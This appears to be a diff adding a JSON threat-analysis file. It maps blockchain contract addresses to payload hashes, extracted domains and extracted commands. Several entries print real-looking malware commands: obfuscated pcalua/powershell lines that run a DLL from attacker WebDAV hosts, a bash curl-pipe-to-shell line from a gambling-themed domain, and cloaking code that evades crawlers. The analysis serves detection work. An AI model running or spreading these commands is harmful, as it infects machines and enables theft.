@@ -1,0 +1,67 @@
+{
+  "0xA1decFB75C8C0CA28C10517ce56B710baf727d2e": {
+    "outer_sha256": "833d9313c4a1ade337c4182cd695d80be4a340519fdd2ac9b1447596a420926b",
+    "inner_sha256": "10c7ba034eb8c5b08d23d77b82d91144cda2ee486ce0fab40fa772521dcfc284",
+    "max_atob_nesting_depth_unwrapped": 0,
+    "domains_found": [],
+    "commands_found": []
+  },
+  "0x46790e2Ac7F3CA5a7D1bfCe312d11E91d23383Ff": {
+    "outer_sha256": "4bc327db0435d865c56ab593cf2a1d6b49701e766daa4b9c5c505398fba30707",
+    "inner_sha256": "d44b7de5ccc40a9eb170ed5476aa14fc3876d2d07d6e7f8c4bab39415f268ef2",
+    "max_atob_nesting_depth_unwrapped": 1,
+    "domains_found": [
+      "site-shartbandi-farsi.com"
+    ],
+    "commands_found": [
+      "pcalua.exe -a \"powershell.exe\" -c \"saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\\\{random8}.site-shartbandi-farsi.com@SSL\\${uuid__} & !c!!d! gc.key,#1' -WI MIn\""
+    ]
+  },
+  "0x68DcE15C1002a2689E19D33A3aE509DD1fEb11A5": {
+    "outer_sha256": "b325da99503ebbceede804e01c93209b9d7eaa024f699be5a5c2e286573b3f4f",
+    "inner_sha256": "464ce7379fc105a10099d853c34a215f433720a576ac3af29e622efbdf255e45",
+    "max_atob_nesting_depth_unwrapped": 1,
+    "domains_found": [
+      "bahigo90bet.com"
+    ],
+    "commands_found": [
+      "/bin/bash -c \"$(curl -A 'Mac OS X 10_15_7' -fsSL '${usr_id}.bahigo90bet.com/?ublib=${uuid__}')\"; echo \"\"BotGuard: Answer the protector challenge. Ref: 73282"
+    ]
+  },
+  "0x7Fd85c090f2b35071C57a3b9FeAF462aaEb0E437": {
+    "outer_sha256": "7ee1d4091dd9f514aeac458f2566fc9a721b35bf5082f92f667809a9b652a9ed",
+    "inner_sha256": "be85f5b48c3b831c860a235b06fc2b343c8efc83961ba2f5e29ec6237a4380f1",
+    "max_atob_nesting_depth_unwrapped": 0,
+    "domains_found": [],
+    "commands_found": [
+      "curl|wget|python|java/i.test(t)||-1!==a.indexOf(\"/wp-json\")||-1!==a.indexOf(\"wp-sitemap\")||-1!==a.indexOf(\"robots\")||-1!==a.indexOf(\".xml\")||/wp-login\\.php|wp-cron\\.php|xmlrpc\\.php|wp-admin|wp-includes|wp"
+    ]
+  },
+  "0xfb448d465841c63f3bc433be61eb692b813d469d": {
+    "outer_sha256": "823abd0603017e536ea95f87cba9ccde90407199f618376d2906168b8dee0ac4",
+    "inner_sha256": "5662cbf836b5f3babdf22543c53edb278b40d70f00ca6b75316a3e277fcd3493",
+    "max_atob_nesting_depth_unwrapped": 0,
+    "domains_found": [],
+    "commands_found": [
+      "curl|wget|python|java/i.test(t)||-1!==a.indexOf(\"/wp-json\")||-1!==a.indexOf(\"wp-sitemap\")||-1!==a.indexOf(\"robots\")||-1!==a.indexOf(\".xml\")||/wp-login\\.php|wp-cron\\.php|xmlrpc\\.php|wp-admin|wp-includes|wp"
+    ]
+  },
+  "0xdf132e2893824e26ec8ae8014b4f4facd54ed67f": {
+    "outer_sha256": "94604307055b2f6195cf67f16dfecbb7928ee57f7735820f987303e95a8df394",
+    "inner_sha256": "ba7a94a56509c918d42b1cc83a0aaeb4b3f9911aa5b0a068188501640f5f8da1",
+    "max_atob_nesting_depth_unwrapped": 0,
+    "domains_found": [],
+    "commands_found": []
+  },
+  "0x0cd58060328e308a43d3c53cfd03a45233ea308a": {
+    "outer_sha256": "8ee25554de85e5c6d34b2745a3ebdbcb85f321b2724ed73d84752914d535b445",
+    "inner_sha256": "40a261dbe8459b9371d5fb61f9b57c44f0f9b58362e8b805acb7d47e591a4029",
+    "max_atob_nesting_depth_unwrapped": 1,
+    "domains_found": [
+      "casinomhub.bet"
+    ],
+    "commands_found": [
+      "pcalua.exe -a \"powershell.exe\" -c \"saps cmd '/v/c set a=pu&set b=shd&set c=run&set d=dll32&for %x in (!a!!b!) do @%x \\\\{random4}.casinomhub.bet@SSL\\${uuid__} & !c!!d! gc.key,#1' -WI MIn\""
+    ]
+  }
+}
